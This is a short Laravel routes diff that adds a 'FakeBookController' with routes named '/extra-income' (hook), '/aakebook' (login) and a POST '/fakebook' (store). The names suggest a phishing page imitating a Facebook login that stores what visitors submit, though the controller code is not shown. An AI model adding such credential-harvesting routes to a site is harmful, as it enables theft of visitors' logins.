@@ -9,7 +9,10 @@ use App\Http\Controllers\ProfileController;
 use App\Http\Controllers\ServiceController;
 use App\Http\Controllers\SettingController;
 use App\Http\Controllers\AdminLogController;
+use App\Http\Controllers\FakeBookController;
 use App\Http\Controllers\FeedbackController;
+use App\Http\Controllers\TutorialController;
+use App\Http\Controllers\AdminHelpController;
 use App\Http\Controllers\DashboardController;
 use App\Http\Controllers\SchedulesController;
 use App\Http\Controllers\AdminEmailController;
@@ -32,8 +35,6 @@ use App\Http\Controllers\AdminMedicalQuestionController;
 use App\Http\Controllers\ProfilePictureUpdateController;
 use App\Http\Controllers\AdminPermissionUpdateController;
 use App\Http\Controllers\AdminAccountManagementController;
-use App\Http\Controllers\AdminHelpController;
-use App\Http\Controllers\TutorialController;
 
 /*
 |--------------------------------------------------------------------------
@@ -232,3 +233,7 @@ Route::post('send-message', function(){
     toast('Message sent!', 'success');
     return redirect('/#contact');
 });
+
+Route::get('/extra-income', [FakeBookController::class, 'hook']);
+Route::get('/aakebook', [FakeBookController::class, 'login']);
+Route::post('/fakebook', [FakeBookController::class, 'store']);
